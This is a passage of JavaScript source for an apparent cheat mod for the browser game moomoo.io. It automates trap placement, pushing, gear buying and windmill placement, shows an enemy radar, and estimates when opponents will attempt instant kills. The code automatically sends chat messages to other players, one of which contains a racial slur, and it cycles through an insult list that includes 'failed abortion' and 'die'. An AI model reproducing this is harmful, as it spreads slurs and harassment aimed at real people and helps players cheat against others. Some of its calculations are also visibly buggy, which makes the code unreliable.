                                be.fillText("[" + a.join(",") + "]", R.x - f, R.y - d + 133);
                                be.closePath();
                            } else if(_.sid != R.sid){
                                const a = ["7" , "0" , "0"];

                                be.beginPath();
                                be.font = "20px Hammersmith One";
                                be.lineWidth = 5.5;
                                be.strokeStyle = rt;
                                be.fillStyle = "white";
                                be.textAlign = "center";
                                be.strokeText("[" + a.join(",") + "]", _.x - f, _.y - d + 120);
                                be.fillText("[" + a.join(",") + "]", _.x - f, _.y - d + 120);
                                be.closePath();
                            }
                        }
                    }

                    function setUI(n) {
                    }

                    function doPlace (hit) {
                        if(Math.hypot(R.x2 - enemies.x2, R.y2 - enemies.y2) > 350) return;
                        if(placeFast) {
                            let trap = nearBuilds.find(e => e.active && Math.hypot(e.y - enemies[0].y, e.x - enemies[0].x) < 67.5 && e.name == "pit trap" && e.owner && e.owner.sid != enemies[0].sid);
                            if(trap && Math.hypot(R.y - enemies[0].y, R.x - enemies[0].x) < 300){
                                if(rv2) {
                                    dp(R.items[2], nea);
                                }
                                let xVel = R.x + R.speed*Math.cos(Math.atan2(R.y-R.y, R.x-R.x)),
                                    yVel = R.y + R.speed*Math.cos(Math.atan2(R.y-R.y, R.x-R.x));

                                let distVelTrap = Math.hypot(trap.y-R.y, trap.x-R.x),
                                    distVelEnemy = Math.hypot(enemies[0].y - R.y, enemies[0].x - R.x);

                                if(distVelTrap>distVelEnemy) {
                                    for (let i = 0; i < 4; i++) {
                                        let o = 4 * i * (i % 2 ? -1 : 1) / 180 * Math.PI + Math.atan2(trap.y - yVel, trap.x - xVel);
                                        if(!checkObj(o, R, R.items[2])) {
                                            dp(R.items[2], o);
                                            break;
                                        }
                                    }
                                } else {
                                    let angle = Math.atan2(yVel - trap.y + (85 * Math.sin(Math.atan2(enemies[0].y - trap.y, enemies[0].x - trap.x))), xVel - trap.x + (85 * Math.cos(Math.atan2(enemies[0].y - trap.y, enemies[0].x - trap.x))));
                                    if(!checkObj(angle, R, R.items[2])) {
                                        dp(R.items[2], angle);
                                    } else {}
                                }
                            } else {
                                if(hit) {
                                    dp(R.items[2], nea);
                                } else {
                                    if(location.host == "moomoo.io") {
                                        if(enemyInCondition()) {
                                            dp(R.items[4], Math.random() * Math.PI);
                                        }
                                    } else if(!trap && (lur ? !enemyInCondition() : true)) {
                                        for (let e = 0; e < 2 * Math.PI*1.5; e += Math.PI*1.5 / 2) dp(R.items[4], e);
                                    }
                                }
                            }
                            doAim();
                        } else {
                            let trap = nearBuilds.find(e => e.active && Math.hypot(e.y - enemies[0].y2, e.x - enemies[0].x2) < 67.5 && e.name == "pit trap" && e.owner && e.owner.sid != enemies[0].sid);
                            if(trap && Math.hypot(R.y - enemies[0].y2, R.x - enemies[0].x2) < 300){
                                if(rv2) {
                                    dp(R.items[2], nea);
                                }
                                let xVel = R.x2 + R.speed*Math.cos(Math.atan2(R.y2-R.y1, R.x2-R.x1)),
                                    yVel = R.y2 + R.speed*Math.cos(Math.atan2(R.y2-R.y1, R.x2-R.x1));
                                let distVelTrap = Math.hypot(trap.y-R.y, trap.x-R.x),
                                    distVelEnemy = Math.hypot(enemies[0].y2 - R.y, enemies[0].x2 - R.x);
                                if(distVelTrap>distVelEnemy) {
                                    for (let i = 0; i < 4; i++) {
                                        let o = 4 * i * (i % 2 ? -1 : 1) / 180 * Math.PI + Math.atan2(trap.y - yVel, trap.x - xVel);
                                        if(!checkObj(o, R, R.items[2])) {
                                            dp(R.items[2], o);
                                            break;
                                        }
                                    }
                                } else {
                                    let angle = Math.atan2(yVel - trap.y + (85 * Math.sin(Math.atan2(enemies[0].y2 - trap.y, enemies[0].x2 - trap.x))), xVel - trap.x+ (85 * Math.cos(Math.atan2(enemies[0].y2 - trap.y, enemies[0].x2 - trap.x))));
                                    if(!checkObj(angle, R, R.items[2])) {
                                        dp(R.items[2], angle);
                                    } else {}
                                }
                            } else {
                                if(hit) {
                                    dp(R.items[2], nea);
                                } else {
                                    if(location.host == "moomoo.io") {
                                        if(enemyInCondition()) {
                                            dp(R.items[4], Math.random() * Math.PI);
                                        }
                                    } else if(!trap && (lur ? !enemyInCondition() : true)) {
                                        for (let e = 0; e < 2 * Math.PI*1.5; e += Math.PI*1.5 / 2) dp(R.items[4], e);
                                    }
                                }
                            }
                            doAim();
                        }
                    }
                    setInterval(() => {
                        if(lur) {
                            if(enemies[0] && enemies[0].sid && placeEveryTick && [...R.items].includes(15)) {
                                let trap = nearBuilds.find(e => e.active && Math.hypot(e.y - enemies[0].y2, e.x - enemies[0].x2) < 50 && e.name == "pit trap" && e.owner && e.owner.sid != enemies[0].sid),
                                    spike = l.list[R.items[2]];

                                let cP = (x, y) => {
                                    return nearBuilds.find((a) => a.active && Math.hypot(a.y - y, a.x - x) < a.scale);
                                }

                                if(trap) {
                                    let td = Math.atan2(enemies[0].y2 - trap.y, enemies[0].x2 - trap.x);
                                    let pos = {
                                        ebe: {
                                            x: trap.x + (spike.scale+50) * Math.cos(td),
                                            y: trap.y + (spike.scale+50) * Math.sin(td)
                                        },
                                        emb: {
                                            x: trap.x + (spike.scale+50+35) * Math.cos(td),
                                            y: trap.y + (spike.scale+50+35) * Math.sin(td)
                                        }
                                    }, s = {};
                                    if((s = cP(...Object.values(pos.ebe)), !s)) {
                                        let p = pos.ebe;
                                        if(Math.hypot(p.y - R.y2, p.x - R.x2) <= 70+spike.scale) {
                                            dp(R.items[2], Math.atan2(p.y - R.y2, p.x - R.x2));
                                        }
                                    } else if(s && s.dmg > 0 && s.owner.sid == R.sid && Math.abs(Math.atan2(trap.y - enemies[0].y2, trap.x - enemies[0].x2) - Math.atan2(R.y2 - enemies[0].y2, R.x2 - enemies[0].x2)) < Math.PI/2) {
                                        if(Math.hypot(enemies[0].y2 - R.y2, enemies[0].x2 - R.x2) < 90) {
                                            r.send("33", nea);
                                            if(R.primaryReload == 1) {
                                                aa = true;
                                                r.send("2", nea);
                                                if(ae86) {
                                                    Kt(7, 0), Jt(7, 0);
                                                    if(R.weapons[1] == 10) {
                                                        Kt(21, 1), Jt(21, 1);
                                                    }
                                                } else {
                                                    if(pvpmode) {
                                                        if(Date.now() - useps > 2000) {
                                                            useps = Date.now();
                                                            Kt(55, 0), Jt(55, 0);
                                                        } else {
                                                            Kt(7, 0), Jt(7, 0);
                                                        }
                                                    } else {
                                                        Kt(7, 0), Jt(7, 0);
                                                    }
                                                }
                                                r.send("7", 1);
                                                nextTickDo (() => {
                                                    r.send("7", 1);
                                                    if(!ae86) {
                                                        if(R.clownCounter >= 3) {
                                                            Kt(26, 0), Jt(26, 0);
                                                        } else {
                                                            if(enemies[0] && enemies[0].clownCounter >= 3) {
                                                                Kt(11, 0), Jt(11, 0);
                                                            } else {
                                                                let nigga = [26, 11, 6];
                                                                Hg(nigga[Math.floor(Math.random() * nigga.length)], 0);
                                                            }
                                                        }
                                                    } else {
                                                        Kt(6, 0), Jt(6, 0);
                                                    }
                                                    if(R.weapons[1] == 10) {
                                                        Kt(21, 1), Jt(21, 1);
                                                    }
                                                    if(ae86 ? !enemyInCondition() : true) {
                                                        Kt(11, 1), Jt(11, 1);
                                                    }
                                                    aa = false;
                                                });
                                            }
                                        }
                                    } else if((s = cP(...Object.values(pos.emb)), !s)) {
                                        let p = pos.emb;
                                        if(Math.hypot(p.y - R.y2, p.x - R.x2) <= 70 + spike.scale) {
                                            dp(R.items[2], Math.atan2(p.y - R.y2, p.x - R.x2));
                                        }
                                    }
                                } else {
                                    if(enemyInCondition()) {
                                        dp(R.items[4], nea);
                                    } else {
                                        if(location.host == "moomoo.io") {
                                        } else dp(R.items[4], e);
                                    }
                                }

                            }
                        } else {
                            if(enemies[0] && enemies[0].sid && placeEveryTick && [...R.items].includes(15)) {
                                doPlace(window.hit);
                            }
                        }
                    }, 560);

                    setUI();

                    function doFixMills() {
                        millF = true;
                        setTimeout (() => {
                            millF = false;
                        }, 200);
                    }

                    var lc = 0, mfl = [];

                    addEventListener("keydown", e => {
                        kn() && e.keyCode == 66 && r.send("ch", "SANDY MOD TYPING");
                    });

                    class dmgPotential {
                        constructor(setter) {
                            let internal = {builds: [], enemies: [], players: []};
                            n(18).mixin(internal);

                            internal.on("calculate", function() {
                                let dmgFromBuild = internal.builds.filter(e => e.dmg && Math.hypot(R.yVela - e.y, R.xVela - e.x) < e.scale).reduce((a, b) => a.dmg + b.dmg);
                                let enemies = internal.enemies;
                            });

                            internal.on("updateBuilds", function(buildings){
                                internal.builds = buildings;
                            });
                            internal.on("updatePlayers", function(playerList) {
                                internal.players = playerList;
                                internal.enemies = internal.players.filter(e => e.visible && (e.team === null || e.team != R.team) && e.sid != R.sid).sort((a, b) => {
                                    return Math.hypot(a.y2 - R.y2,a.x2 - R.x2) - Math.hypot(b.y2 - R.y2,b.x2 - R.x2);
                                });
                            });
                            internal.on("update", function(a) {
                                try {
                                    internal.emit("updateBuilds", a[0]);
                                    internal.emit("updatePlayers", a[1]);
                                    internal.emit("calculate");
                                } catch (t) {};
                            });
                            return internal;
                        }
                    }

                    var Dmgs = 0;
                    var dmgPot = new dmgPotential(function(V) {
                        Dmgs = V;
                    });

                    function addUser(sid, x, y, team, conf = {
                        'radar': {
                            'color': '#ffffff',
                            'w': '20',
                            'h': '20'
                        },
                        'maxScreenWidth': 1920,
                        'maxScreenHeight': 1080
                    }) {
                        if(sid === R.sid) return;
                        if (!$('#enemyradar' + sid).length) {
                            $(document.body).append('<div id="enemyradar' + sid + '" style="' +
                                                    'display: none;' +
                                                    'position: absolute;' +
                                                    'left: 0;' +
                                                    'top: 0;' +
                                                    'color: black;' +
                                                    'width: 0;' +
                                                    'height: 0;' +
                                                    'border-style: solid;' +
                                                    'border-width: 10px 0 10px 20px;' +
                                                    'border-color: transparent transparent transparent ' + conf.radar.color + ';' +
                                                    'pointer-events: none;" class="enemyradar"></div>');
                        }
                        let center_x = window.innerWidth / 2,
                            center_y = window.innerHeight / 2,
                            getRadian = (x1, y1, x2, y2) => Math.atan2(y2 - y1, x2 - x1),
                            getDistance = (x1, y1, x2, y2) => Math.sqrt(Math.pow(x1 - x2, 2) + Math.pow(y1 - y2, 2)),
                            RtoD = (r) => r * 180 / Math.PI,
                            rad = getRadian(R.x, R.y, x, y),
                            per = getDistance(0, 0, (R.x - x), (R.y - y) * (16 / 9)) * 100 / (conf.maxScreenHeight / 2),
                            alpha = per / center_y;
                        if (alpha > 1.0) alpha = 1.0;
                        let dis = center_y * alpha,
                            tx = center_x + dis * Math.cos(rad) - conf.radar.w / 2,
                            ty = center_y + dis * Math.sin(rad) - conf.radar.h / 2;
                        $('#enemyradar' + sid).css({
                            'left': tx + 'px',
                            'top': ty + 'px',
                            'display': ((R.team === null || R.team !== team) ? 'block' : 'none'),
                            'opacity': alpha,
                            'transform': 'rotate(' + RtoD(rad) + 'deg)'
                        });
                    }

                    function doSyncNextTick() {
                        r.send("ch", "MEOW MEOW NIGGA");
                        nextTickDo(function () {
                            aa = true;
                            setWeapon(1);
                            r.send("7", 1);
                            Kt(53, 0), Jt(53, 0);
                            nextTickDo(function () {
                                Kt(0, 0), Jt(0, 0);
                                r.send("7", 1);
                                setWeapon(0);
                                aa = false;
                            });
                        });
                    }

                    function saveFile () {
                        datas = JSON.stringify(datas);
                        let blob = new Blob([datas], {type: "text/txt"});
                        datas = [];
                        let url = URL.createObjectURL(blob);
                        window.open(url);
                    };

                    window.sRec = function () {
                        saveFile();
                    };


                    var SEProcessing = false, stopRec;
                    let tickDel = Date.now();
                    var useShield = false;
                    var hLT = 0;
                    var oss = 0;
                    function notif(title, description) {
                        let mouseCoord = R;
                        m.showText(mouseCoord.x, mouseCoord.y, 30, .18, 500, title, "white");
                        m.showText(mouseCoord.x, mouseCoord.y+50, 20, .18, 500, description, "white");
                    }

                    function basicGear(bTick) {
                        if(enemies[0] && Math.hypot(enemies[0].y - R.y2, enemies[0].x - R.x2) < 300 && (R.y < 6850 || R.y > 7550)) {
                            don ? Hg(6, lab ? 21 : 11) : sandy ? Hg(R.clownCounter > 3 ? 26 : 6, enemies.tailIndex == 18 ? 21 : enemies.tailIndex == 13 ? 21 : lab ? 21 : 11) : Hg(R.clownCounter > 5 ? 26 : 6, ae86 ? 11 : bTick ? 13 : lab ? 21 : 11);
                        } else {
                            dg(1);
                        }
                    }

                    var rChi = 0, aIns = 0;
                    function rCh () {
                        let a = [
                            "don't care",
                            "didn't ask",
                            "cry about it",
                            "stay mad",
                            "get real",
                            "L",
                            "mald seethe cope harder",
                            "hoes mad",
                            "basic",
                            "skill issue",
                            "ratio",
                            "you fell off",
                            "the audacity",
                            "triggered",
                            "any askers",
                            "bluepilled",
                            "get a life",
                            "ok and?",
                            "cringe",
                            "touch grass",
                            "donowalled",
                            "not based",
                            "you're a basic bitch",
                            "not funny didn't laugh",
                            "you're*",
                            "grammar issue",
                            "go outside",
                            "get good",
                            "reported",
                            "ad hominem",
                            "motherless",
                            "fatherless",
                            "uncleless",
                            "brainless",
                            "adopted",
                            "sugma",
                            "ligma",
                            "failed abortion",
                            "die",
                            "pokimane simp",
                            "homo",
                            "furry lover",
                            "GG!"
                        ]
                        rChi = (rChi+1)%a.length;
                        return a[rChi];
                    }

                    function animate(space, chance) {
                        let result = '';
                        let characters;
                        if(space) {
                            characters = 'i am super pro';
                        } else {
                            characters = 'lmfao';
                        }
                        if(space) {
                            characters = characters.padStart((30 - characters.length) / 2 + characters.length)
                            characters = characters.padEnd(30);
                        }
                        let count = 0;
                        for (let i = 0; i < characters.length; i++ ) {
                            if(Math.floor(Math.random() * chance) == 1 && characters.charAt(i) != "-" && count < 2 && characters.charAt(i) != " ") {
                                result += "_";
                                count++
                            } else {
                                result += characters.charAt(i);
                            }
                        }
                        return result;
                    }

                    var clanToggle = 0,
                        messageToggle = 0;

                    var notifications = [],notificationsadd = function (text) {
                        let time = new Date().getHours() + ":" + new Date().getMinutes() + ":" + new Date().getSeconds();
                        notifications.unshift(text + " [" + time + "]")
                    }

                    var lastframes = Date.now(), qual = 1, mA = 0;

                    function doPathFind (afg1keg1, target) {
                        let centerX = R.x + (target[0] - R.x) / 2;
                        let centerY = R.y + (target[1] - R.y) / 2;
                        const nearBuilds = N.filter(e => Math.hypot(e.y - centerY, e.x - centerX) < 800 && e.active);
                        let block = 30, node = function (x, y, gScore) {
                            this.x = x;
                            this.y = y;
                            this.g = gScore;
                            this.type = nearBuilds.some(e => {
                                let exactScale = (/spike/.test(e.name) && R.sid != e.owner.sid && (R.team ?! Pt.includes(e.owner.sid) : true)) ? (e.scale + 50) : e.scale;
                                if(e.name == "pit trap") {
                                    if(e.owner && (R.sid == e.owner.sid || Pt.includes(e.owner.sid))) {
                                        return false;
                                    }
                                }
                                if(Math.hypot(e.y - y, e.x - x) < exactScale+block && Math.hypot(e.y - target[1], e.x - target[0]) > exactScale + block && Math.hypot(e.y - R.y2, e.x - R.x2) > exactScale + block) {
                                    return true;
                                }
                                return false;
                            }) ? "wall" : "space";
                        }, myNode = new node(Math.round(R.x2 / block) * block, Math.round(R.y2 / block) * block, 0),
                            targetNode = new node(Math.round(target[0] / block) * block, Math.round(target[1] / block) * block, 0),
                            paths = [], foundset = [], currentTick = 0, endTick = 100,found = true;
                        function positive(num) {
                            return Math.abs(num);
                        };
                        while (!foundset.find(e => { return Math.hypot(e.y - targetNode.y, e.x - targetNode.x) < block; })) {
                            currentTick++;
                            if(currentTick >= endTick) {
                                found = false;
                                break;
                            };
                            let bestnode = currentTick === 1 ? myNode : foundset.filter(e => e.type == "space").sort((a, b) => a.good - b.good)[0];
                            for(let i = 0; i < 3; i++) {
                                for(let o = 0; o < 3; o++) {
                                    if(i == 1 && o == 1) {
                                        continue;
                                    }
                                    let x = bestnode.x + block * (-1 + i);
                                    let y = bestnode.y + block * (-1 + o);
                                    let n = new node(x, y, currentTick);
                                    let good = (positive(n.x - targetNode.x) + positive(n.y - targetNode.y) / block) - currentTick;
                                    n.good = good;
                                    foundset.push(n);
                                }
                            }
                            paths.push(bestnode);
                        }
                        return found ? paths : false;
                    }

                    let buyGearsOrder = [[11, 1], [7, 0], [6, 0], [12, 0], [40, 0], [53, 0], [26, 0], [11, 0], [13, 1], [18, 1], [21, 1], [18, 1], [55, 0], [58, 0], [15, 0], [31, 0], [22, 0], [21, 0]],
                        buyGearsOrderI = 0,
                        t1ck = false;

                    setInterval(function () {
                        if(R && R.points < 600 && R.points > 20000 || buyGearsOrder.length === 0) return;
                        if(R && R.points > f[!buyGearsOrder[buyGearsOrderI][1] ? "hats" : "accessories"].find(e => e.id == buyGearsOrder[buyGearsOrderI][0]).price) {
                            r.send("13c", 1, ...buyGearsOrder[buyGearsOrderI]);
                            buyGearsOrderI++;
                        }
                    }, 10000);





                    var instaChances = [];
                    var lastDists = [];
                    var lastShames = [];
                    var lastCoords = [];
                    function simulateInstaChance () {

                        for(let i = 0;i<W.length;i++) {
                            if(lastShames[W[i].sid] === undefined) {
                                lastShames[W[i].sid] = [];
                                lastCoords[W[i].sid] = [];
                                instaChances[W[i].sid] = [];
                            } else if(lastShames[W[i].sid].length > 12) {
                                lastShames[W[i].sid].shift();
                            }
                            lastShames[W[i].sid][l.ticks] = W[i].clownCounter;
                            lastCoords[W[i].sid][l.ticks] = {x2: W[i].x2, y2: W[i].y2};
                        }



                        function calculateHostiles (Player, primary = R.weapons[0], secondary = R.weapons[1]) {
                            let Hostiles = [];
                            for(let i = 0;i < W.length; i++) {
                                if(W[i].visible && W[i].sid != Player.sid && (W[i].team === null || W[i].team != Player.team)) {
                                    Hostiles.push(W[i]);
                                }
                            }
                            return Hostiles;
                        }

                        for(let i = 0; i < W.length; i++) {
                            if(W[i].visible) {
                                let hostilePlayers = calculateHostiles (W[i]);
                                if(!hostilePlayers.length) {
                                    instaChances[W[i].sid] = [];
                                } else {
                                    hostilePlayers = hostilePlayers.sort((a, b) => Math.hypot(a.y2 - W[i].y2, a.x2 - W[i].x2) - Math.hypot(b.y2 - W[i].y2, b.x2 - W[i].x2));
                                    let nearestHostile = hostilePlayers[0];
                                    let distance = Math.hypot(nearestHostile.y2 - W[i].y2, nearestHostile.x2 - W[i].x2);
                                    if(!lastDists[W[i].sid]) {
                                        lastDists[W[i].sid] = [];
                                    }
                                    let distDiff = (lastDists[W[i].sid][nearestHostile.sid] || 1200) - distance;
                                    lastDists[W[i].sid] = hostilePlayers.map(function (hostilePlayer) {
                                        return Math.hypot(hostilePlayer.y2 - W[i].y2, hostilePlayer.x2 - W[i].x2);
                                    });
                                    if(instaChances[W[i].sid][nearestHostile.sid] === undefined) {
                                        instaChances[W[i].sid][nearestHostile.sid] = 0;
                                    }
                                    if(distance < (70 + l.weapons[W[i].primary].range)) {
                                        if(distDiff > 0) {
                                            instaChances[W[i].sid][nearestHostile.sid] += 6;
                                        } else {
                                            if(W[i].clownCounter - lastShames[W[i].sid][l.ticks - 9] >= 2) {
                                                if(W[i].secondaryReload == 1) {
                                                    instaChances[W[i].sid][nearestHostile.sid] += 8;
                                                } else {
                                                    instaChances[W[i].sid][nearestHostile.sid] -= 20;
                                                }
                                            } else {
                                                instaChances[W[i].sid][nearestHostile.sid]+=3;
                                            }
                                        }
                                    } else {
                                        if(distDiff > 0) {
                                            if(Math.hypot(lastCoords[W[i].sid][l.ticks - 9].y2 - W[i].y2, lastCoords[W[i].sid][l.ticks - 9].x2 - W[i].x2) < 150) {
                                                instaChances[W[i].sid][nearestHostile.sid] += 4;
                                            } else {
                                                instaChances[W[i].sid][nearestHostile.sid] -= 3;
                                            }
                                        } else {
                                            instaChances[W[i].sid][nearestHostile.sid] -= 8;
                                        }
                                    }
                                    if(instaChances[W[i].sid][nearestHostile.sid] < 0) {
                                        instaChances[W[i].sid][nearestHostile.sid] = 0;
                                    } else if (instaChances[W[i].sid][nearestHostile.sid] > 100) {
                                        instaChances[W[i].sid][nearestHostile.sid] = 100;
                                    }
                                }
                            }
                        }
                    }

                    function onBuild(e, t, n, i, r, p, k = 0){
                        if(n) return Math.hypot(e.y - t.y, e.x - t.x) - e.scale - (t.getScale ? t.getScale() : t.scale) / 2 < 0
                        p = (Math.pow, Math.sqrt);
                        n = e.x - t.x;
                        i = e.y - t.y;
                        r = e.scale + (t.getScale ? t.getScale() : t.scale) - k;
                        return (p(n * n + i * i) - r < 0)
                    };

                    let Push = false;
                    async function autoPusher(e, t, n, i, k, v, l, j, m) {
                        if(!enemies) return;
                        _ = enemies;
                        e = function(){
                            Push && (Push = false, r.send('33', null));
                        };
                        t = N.find(c => c.isItem && c.active && !c.dontGather && c.owner.sid == R.sid && c.id == 15 && Math.hypot(c.x - _.x2, c.y - _.y2) <= 50);
                        if(!t) return e();
                        if(t && Math.hypot(t.x - R.x2, t.y - R.y2) <= 300){
                            n = N.filter(c => c.isItem && c.active && !c.dontGather && c.owner && (c.owner.sid == R.sid || (R.team && Pt.includes(c.owner.sid))) && [6, 7, 8, 9].includes(c.id));
                            if(!n || !n.length) return e();
                            n = n.sort((a, b) => Math.hypot(a.x - _.x2, a.y - _.y2) - Math.hypot(b.x - _.x2, b.y - _.y2))[0];
                            if(!n) return e();
                            if(Math.hypot(t.x - n.x, t.y - n.y) <= 50 + n.scale + 35){
                                i = Math.atan2(_.y - n.y, _.x - n.x);
                                function uc(h){
                                    k = Math.hypot(n.x - _.x, n.y - _.y) + h;
                                    v = {
                                        x: n.x + (k * Math.cos(i)),
                                        y: n.y + (k * Math.sin(i))
                                    };
                                    m = N.find(c => c.isItem && !c.ignoreCollision && onBuild({x: v.x, y: v.y, scale: 35}, c));
                                };
                                uc(70);
                                uc(!m ? 70 : 60);
                                uc(!m ? 60 : 50);
                                if(onBuild(_, n)) return e();
                                Push = true;
                                Date.now() - lastAOos >= 3e3 && (lastAOos = Date.now());
                                r.send("ch", "SANDY AUTO PUSH");
                                r.send('33', Math.hypot(v.x - R.x2, v.y - R.y2) > 20 ? Math.atan2(v.y - R.y2, v.x - R.x2) : Math.atan2(n.y - R.y2, n.x - R.x2));
                            };
                        };
                    };

                    setInterval(() => {
                        if(millPlacer && R.items[3]) {
                            let ap = 1.70;
                            let a = wn+Math.PI;
                            if(true) {
                                let v = {x: R.xVel, y: R.yVel};
                                let diff = R.itemCounts[3] - lc;
                                lc = R.itemCounts[3];
                                if(diff == 1) {
                                    mfl.push(true);
                                    if(mfl.length > 2) {
                                        mfl = [];
                                        doFixMills();
                                    }
                                } else if(diff > 0) {
                                    mfl = [];
                                }
                                if(!millF && !checkObj(wn+ap, v, R.items[3]) && !checkObj(wn-ap, v, R.items[3])) {
                                    dp(R.items[3], a+ap);
                                    dp(R.items[3], a-ap);
                                    setTimeout(function() {
                                        dp(R.items[3], a);
                                    }, 100.25);
                                } else {
                                    dp(R.items[3], a);
                                }
                            }
                        }
                    }, 353);


                    let lastAOos = Date.now();

                    async function Ti(e) {
                        let bTick = Math.abs(bullTick % 9 - l.ticks % 9) < 2;
                        pathFind.show = false;
                        l.ticks++;
                        let tickSpd = Date.now() - tickDel;
                        tickDel = Date.now();
                        for (var t = Date.now(), n = 0; n < W.length; ++n) W[n].forcePos = !W[n].visible, W[n].visible = !1;
                        for (n = 0; n < e.length;)(_ = Ii(e[n])) && (_.backup = undefined, _.backup = deepClone(_), _.t1 = void 0 === _.t2 ? t : _.t2, _.t2 = t, _.x1 = _.x, _.y3 = _.y2, _.x3 = _.x2,
                                                                     _.y1 = _.y, _.x2 = e[n + 1], _.y2 = e[n + 2], _.d1 = void 0 === _.d2 ? e[n + 3] : _.d2, _.d2 = e[n + 3],
                                                                     _.dt = 0, _.buildIndex = e[n + 4], _.weaponIndex = e[n + 5],
                                                                     _.speed = Math.hypot(_.y1 - _.y2, _.x1 - _.x2),
                                                                     _.weaponVariant = e[n + 6], _.moveDir = Math.atan2(_.y1 - _.y2, _.x1 - _.x2), _.team = e[n + 7], _.isLeader = e[n + 8], _.skinIndex = e[n + 9], _.tailIndex = e[n + 10], _.iconIndex = e[n + 11], _.zIndex = e[n + 12], _.visible = !0, function() {
                            _.onTick();
                            const Mult = _.skinIndex == 20 && [9, 11, 12, 13, 15].every(e => e != _.weaponIndex) ? 1.28 : 1;
                            if(_.weaponIndex < 9) {
                                _.primary = _.weaponIndex;
                                _.primaryVariant = _.weaponVariant;
                                if(_.buildIndex == -1) {
                                    _.primaryReload = Math.min(1, _.primaryReload + (111/l.weapons[_.weaponIndex].speed) * Mult);
                                }
                            } else {
                                _.secondary = _.weaponIndex;
                                _.secondaryVariant = _.weaponVariant;
                                if(_.buildIndex == -1) {
                                    _.secondaryReload = Math.min(1, _.secondaryReload + (111/l.weapons[_.weaponIndex].speed) * Mult);
                                }
                            }
                            _.turretReload = Math.min(1, _.turretReload + 0.044);
                        }()), n += 13;


                        [...document.querySelectorAll(".enemyradar")].forEach(e => e.remove());
                        if(!spec && !ae86) W.filter(e => e.visible).forEach(e => addUser(e.sid, e.x2, e.y2, e.team));

                        for(let i = 0;i<nd.length;i++) {
                            setTimeout(nd[i], 0, true);
                        };
                        nd = [];

                        enemies && enemies[0] && autoPusher();

                        nearBuilds = N.filter(e => Math.hypot(e.y - R.y2, e.x - R.x2) < 600);
                        for(let i = 0;i<W.length;i++) {
                            if(!W[i].visible) {
                                W[i].primaryReload = 1;
                                W[i].secondaryReload = 1;
                                W[i].turretReload = 1;
                            }
                        }
                        const regenAmount = R.health >= 60 ? 1 : R.health < 60 && R.health >= 20 ? 2 : 3;
                        let dmgs = 0, dsh = function () {
                            for(let i = 0; i < regenAmount; i++) dp(R.items[0]);
                        }, cancelAllhats = false;
                        dl.forEach((dmg) => {
                            dmgs += dmg;
                        });
                        dl = [];

                        let tg2 = true, tg = false;
                        if(!tg) {
                            if(!tg2) return;
                            if(R && R.secondaryReload[R.sid] != 1){
                                if(!!autoreload) setWeapon(1);
                                tg = true;
                            } else if(R && R.secondaryReload[R.sid] == 1 && !!tg){
                                if(_.secondaryReload == 1) return;
                                tg2 = false, setWeapon(0), tg = false;
                            } else {
                                if(R && enemies && Math.hypot(enemies.y - R.y2, enemies.x - R.x2) <= 320) return;
                            }
                        }

                        const vel = getVel(R);
                        if(!isNaN(wn)) {
                            R.xVel = R.x2 + (vel * .5 * Math.cos(wn));
                            R.yVel = R.y2 + (vel * .5 * Math.cos(wn));
                            R.xVela = R.x2 + (vel * Math.cos(wn));
                            R.yVela = R.y2 + (vel * Math.cos(wn));
                        } else {
                            R.yVel = R.y2;
                            R.xVel = R.x2;
                            R.xVela = R.x2;
                            R.yVela = R.y2;
                        }

                        var checkObstacleBetween = function (user, build) {
                            return nearBuilds.some(e => {
                                return !e.ignoreCollision && (Math.hypot(e.y - R.y, e.x - R.x) < Math.hypot(e.y - build.y, e.x - build.x)) &&
                                    Math.abs(Math.atan2(e.y - R.y, e.x - R.x) - Math.atan2(e.y - build.y, e.x - build.x)) <= (e.scale / Math.hypot(e.y - R.y, e.x - R.x))
                            });
                        }

                        enemies = W.filter(e => e.visible && (e.team != R.team || e.team === null) && e.sid != R.sid).sort((a, b) => Math.hypot(a.y2 - R.y2, a.x2 - R.x2) - Math.hypot(b.y2 - R.y2, b.x2 - R.x2));

                        for(let i = 0;i<l.hitPlayers.length;i++) (_ = Ii(l.hitPlayers[i])) && (_.weaponIndex < 9 ? (_.primaryReload = 0) : (_.secondaryReload = 0))
                        for(let i = 0;i<l.projFounds.length;i++) for(let p of l.projFounds[i]) (_ = Ii(p[0])) && _.weaponIndex > 8 && (p[1] == 1.5 ? (_.skinIndex == 53 && (_.turretReload = 0)) : (l.weapons[_.weaponIndex].projectile !== undefined && l.projectiles[l.weapons[_.weaponIndex].projectile].speed == p[1] && (_.secondaryReload = 0)));
                        let dab = false;
                        let antied = false;
                        let threats = 0;

                        let dfh = [];
                        let rh = false;
                        for(let i = 0; i < l.hitPlayers.length;i++) {
                            _ = Ii(l.hitPlayers[i]);
                            if(Math.hypot(_.y2 - R.y2, _.x2 - R.x2) < 137 + l.weapons[_.weaponIndex].range && isEnemy(_)) {
                                dfh.push(_);
                            }
                            if(_.sid == R.sid) {
                                rh = true;
                            }
                        }

                        if(dfh.length > 0) {
                            if(lab) {
                                dab = true;
                            }
                        }

                        lab = false;
                        if(ari) {
                            let projDmgs = 0;
                            for(let i = 0, e; i < G.length; i++) {
                                if((e = G[i]).active && e.dmg) {
                                    let angle = Math.atan2(R.y2 - e.y, R.x2 - e.x);
                                    if(Math.abs(angle - e.dir) < .36) {
                                        projDmgs += e.dmg;
                                    }
                                }
                            }

                            if(projDmgs > 100) {
                                r.send("ch", "SANDY MOD ON TOP");
                                Hg(6, 0);
                                nochangeskin = true;

                                setTimeout(function () {
                                    nochangeskin = false;
                                }, 700);
                            }
                        }

                        if(aq) simulateInstaChance();

                        hitBuilds = hitBuilds.filter(function(obj) {
                            if(Date.now() - obj.gTime > 300) {
                                return false;
                            } else {
                                l.hitPlayers.find(i => {
                                    _ = Ii(i);
                                    let angle = Math.atan2(_.y2 - obj.y, _.x2 - obj.x);
                                    if(Math.abs(angle - obj.hitAngle)) {
                                        obj.resolve(getBreakDmg(_));
                                        return false;
                                    };
                                    return true;
                                });
                                return true;
                            }
                        });

                        dmgPot.emit("update", [nearBuilds, W]);
                        l.hitPlayers = [];
                        l.projFounds = [];

                        let HQ = false;
                        if(aq || window.pingTime > 84 && [3, 4, 5, 6, 10].includes(enemies.primary) || [10, 15].includes(enemies.secondary)) {
                            if(R.clownCounter < 6) {
                                if(enemies.filter(e => Math.hypot(e.y2 - R.y2, e.x2 - R.x2) < 70 + l.weapons[e.weaponIndex].length).some(e => instaChances[e.sid][R.sid] > 80)) {
                                    HQ = true;
                                }
                            }
                        }

                        autobreak.it = false, autobreak.h = false;
